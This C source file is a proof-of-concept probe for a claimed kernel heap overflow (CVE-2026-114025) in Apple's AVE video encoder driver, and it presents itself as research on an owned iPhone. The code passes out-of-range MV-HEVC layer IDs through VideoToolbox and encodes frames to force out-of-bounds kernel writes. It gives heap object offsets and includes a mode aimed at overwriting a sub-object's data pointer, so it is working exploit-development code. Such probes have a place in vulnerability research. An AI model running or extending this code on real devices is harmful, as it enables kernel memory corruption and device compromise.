/*
 * ave_subobj_probe.c — CVE-2026-114025 Sub-Object Boundary Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Tests two critical questions:
 * 1. Can we trigger writes to sub-object 1 at +0x640 with lid > 96?
 *    (This would corrupt sub-object 2's data pointer at +0xC68)
 * 2. Does the AVE driver accept layer_ids > 255?
 *    (This would enable cross-outer-object OOB writes)
 *
 * The outer encoder object is ~30KB in kalloc.32768. Two sub-objects:
 *   +0x640: Sub-object 1 (1560 bytes, data at +0x658)
 *   +0xC58: Sub-object 2/VPS table (4120 bytes, data at +0xC70)
 *
 * Sub-object 1, lid=97 targets: +0x658 + 97*16 = +0xC68 (data pointer!)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit
 *        -o AVESubobjProbe ave_subobj_probe.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avesubobjprobe
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;
static int g_cb_count = 0;
static int g_cb_status = -999;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_count++;
    g_cb_status = (int)status;
    rlog("  [CB#%d] status=%d flags=0x%x buf=%s\n",
         g_cb_count, (int)status, (int)flags, buf ? "yes" : "null");
}

static CVPixelBufferRef create_pixel_buffer(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static int test_layer_id(const char *label, int layer_id, int do_encode) {
    rlog("\n--- %s: layer_id=%d (0x%x) ---\n", label, layer_id, layer_id);

    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    g_cb_count = 0;
    g_cb_status = -999;
    OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("  CREATE FAILED: %d\n", (int)st);
        return -1;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);

    CFStringRef prof = CFSTR("HEVC_Main_AutoLevel");
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, prof);

    int base_layer = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    OSStatus prop_st = VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    rlog("  SetProperty(MVHEVCVideoLayerIDs=[0,%d]): %d\n", layer_id, (int)prop_st);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    if (prop_st != noErr) {
        rlog("  REJECTED by VideoToolbox (property set failed)\n");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -2;
    }

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    rlog("  Prepare: %d\n", (int)st);

    if (st != noErr) {
        rlog("  PREPARE FAILED — lid=%d rejected at session level\n", layer_id);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -3;
    }

    int result = 0;
    if (do_encode) {
        CVPixelBufferRef pb = create_pixel_buffer(128, 128);
        if (pb) {
            CMTime pts = CMTimeMake(0, 30);
            CMTime dur = CMTimeMake(1, 30);
            st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
            rlog("  Encode: %d\n", (int)st);
            if (st == noErr) {
                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
                usleep(500000);
                rlog("  Callback status: %d, count: %d\n", g_cb_status, g_cb_count);
                result = (g_cb_status == 0) ? 1 : 0;
            } else {
                rlog("  ENCODE FAILED — lid=%d rejected at encode level\n", layer_id);
                result = -4;
            }
            CVPixelBufferRelease(pb);
        }
    } else {
        rlog("  (skipped encode — property-only test)\n");
        result = 1;
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    return result;
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_subobj_probe.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Sub-Object Boundary Probe ===\n");
    rlog("Target: determine max accepted layer_id and sub-object boundary behavior\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "scan";

    if (strcmp(mode, "scan") == 0) {
        rlog("\n== SCAN: Test layer_id acceptance range (property-only, no encode) ==\n");
        int test_lids[] = {1, 63, 64, 95, 96, 97, 100, 127, 128, 200, 255, 256,
                           300, 500, 1000, 1849, 2000, 4096, 10000, 65535, 0};
        for (int i = 0; test_lids[i] != 0; i++) {
            int r = test_layer_id("scan", test_lids[i], 0);
            rlog("  → lid=%d: %s\n", test_lids[i],
                 r == 1 ? "ACCEPTED" : r == -2 ? "REJECTED(prop)" :
                 r == -3 ? "REJECTED(prepare)" : "FAILED");
        }

    } else if (strcmp(mode, "encode_scan") == 0) {
        rlog("\n== ENCODE_SCAN: Test layer_id acceptance with actual encode ==\n");
        rlog("== WARNING: Large lids may cause kernel panic! ==\n");
        int test_lids[] = {1, 63, 64, 95, 96, 97, 127, 200, 255, 0};
        for (int i = 0; test_lids[i] != 0; i++) {
            rlog("\n--- Encoding with lid=%d ---\n", test_lids[i]);
            int r = test_layer_id("encode", test_lids[i], 1);
            rlog("  → lid=%d encode: %s\n", test_lids[i],
                 r == 1 ? "SUCCESS" : r == 0 ? "ENCODE_ERROR" :
                 r == -4 ? "ENCODE_REJECTED" : "FAILED_EARLIER");
            usleep(200000);
        }

    } else if (strcmp(mode, "boundary_97") == 0) {
        rlog("\n== BOUNDARY_97: Test sub-object 1 → sub-object 2 corruption ==\n");
        rlog("== lid=97 targets +0xC68 (VPS table data pointer) ==\n");
        rlog("== This is SAFE if encode produces error, DANGEROUS if it succeeds ==\n");

        rlog("\nStep 1: Create session with lid=97, encode to trigger write\n");
        int r = test_layer_id("boundary", 97, 1);
        rlog("\nResult: %s\n",
             r == 1 ? "ENCODE SUCCEEDED — sub-object boundary write occurred!"
                    : "Encode failed or rejected (safe)");

    } else if (strcmp(mode, "large_lid") == 0) {
        rlog("\n== LARGE_LID: Test layer_ids > 255 with encode ==\n");
        rlog("== WARNING: These writes go past VPS data area into outer object! ==\n");
        int test_lids[] = {256, 300, 500, 0};
        for (int i = 0; test_lids[i] != 0; i++) {
            int r = test_layer_id("large", test_lids[i], 1);
            rlog("  → lid=%d: %s\n", test_lids[i],
                 r == 1 ? "ACCEPTED+ENCODED" : "FAILED/REJECTED");
            usleep(200000);
        }

    } else {
        rlog("Usage: AVESubobjProbe <mode>\n");
        rlog("  scan          -- property-only acceptance test (safe)\n");
        rlog("  encode_scan   -- encode with various lids up to 255 (may crash)\n");
        rlog("  boundary_97   -- test sub-object boundary corruption (may crash)\n");
        rlog("  large_lid     -- test lid > 255 (DANGEROUS, may crash)\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
